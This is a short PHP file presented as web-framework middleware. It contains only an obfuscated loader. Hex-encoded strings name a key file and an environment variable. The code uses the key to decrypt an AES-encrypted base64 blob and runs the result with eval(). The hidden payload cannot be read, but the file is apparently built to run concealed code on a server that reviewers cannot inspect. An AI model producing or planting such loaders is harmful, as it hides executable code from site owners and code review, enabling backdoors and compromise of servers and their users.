<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MZMAMOD5tger66E72sKd5w==');

$c=base64_decode(

'fYeg+3MkOqSKPrl7Ce537UkUdq8qTtXjet2W0Xl50uKxQQgSzrWax3yOu29DYf+K8cSWQJPZkPqj' .
'6ZuAzB5+YS4ocMcgtO7R+u+Ga7r5unqoh4CqxyBNAhC7XL0MmxipInaSX5C6BKtbDg1aJ+ih5aaP' .
'nRdpLBbj9R7uo7wAnnK/4TMOSdzJX8Iqz3sBpXP9q7TF+aBAHeMoEgqZlmJE24UEDQRGrz/DTx/A' .
'LxLmoaYze6jFFlemi4zHslxdKGPUvsO9cPgzW1/omTv/FPaiQgs3RvdYoH7FKIPAV4OM5C04BZVJ' .
'2by0JlPjv1n7RWd4HxFHjRu7ac3Qxhv6fflBniolOrTZi+6lkKMEPjPDxBYBgZXyzgi3HHU3r1cN' .
'03ttlH5V8Goj8goXmfedSqscUSmGCUUed+wxW+VMmK1l5x7JfclCVXy0vFE6idq5VfVrvvZnnEzf' .
'2N8GPjHCblS0b2J/0a7qsyQXuzvJ3w/h2oGyGAnVmjBCmIUMm4DNoJ/kHo/DXnx1BlF0e7h50aoc' .
'TJNvIii+gxUG2SGtBUepZV4kq4mT3v6RysvNJuqlbhWC8E+ihDeHN2NRnQu0noAr8cEDRDLJ1Vl7' .
'vquboXWQzUH7rnjIDvJtOdIk9fvGVWEd78bCUbcUAc7HtUs1aYBziqaYWPBATerQLm26TGjD30AG' .
'd880Wa433n5rlnfDvBa3DWxd4pmeHh8GhHveL5qHEYn7rVN2mRdGevJeidR1glxH81JhxXdx9bqi' .
'8wdU2moFDhozlsSJo13FbhJ7wM8x4zzsqG7fbrMPDSvf3H7ffj9paf+4IE90DRS6g2E1BIGsyFtY' .
'POKMDrL9I75iPF7sXAZaFFhg0TDaSZ3LFhIlDv+BWAVG9wBgAzK8vVBZvFc80fu12JKfvk9NXseo' .
'fAZ/V+nLlLip86Zzjvajv0Yqm2W4y/cTWS49cIiWIhq6MJ7aZqYd4utqP+Rp1qLhUZsMl3JW0S1r' .
'0Hyl1jieKayM6sP0H22rQidz9Q/EvFciwFrmENO74gb5+/0N7KxIv6cB98reDSzuvRl8b743dKBF' .
'MVfQJIOva6n/XRbF+oRz/LAxXxn3ES1cZNEZXkIzICiLY9LD/iQPTGn1D+SfMIGJ+9rncLwgZqcT' .
'u2enrBUnbwUetqM5JjHlbkWUjYtqwRnylp+5aBpwcvEqY9ED+4v6KtyQlMB/cvG73Hxgq4DMN61j' .
'uyIVP0Nleul+lgatLf2aqaa0SptsC6EgOODypQ0KkMveAXNWFK2wOt6ewdNUGL6qUFcxQtGSreEl' .
'Z8nUUNl1ayFSQOho+K0XyP8rE33xYcAe6E5fdil8Mr6+kVae2nCD2AzR794JU3umhMwwJsumuU35' .
'T7GLeUDuVp3IIJVQOO3YNQBGDskIX6yaYqocb6s5Qjtc3/8MaINFegL9IiYKV1nbHzMn3lQr4g5c' .
'0Kryck6m/y/DP8nYYkNuGjfcSHFGhRncimgKXwSLTOT4hbiBOjQ2tMxZ7uqv9eMbAcaGgFZpvK8p' .
'spgL+XQNK8c2KPTc9AD5zFyWkqhK09LPC78jRQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

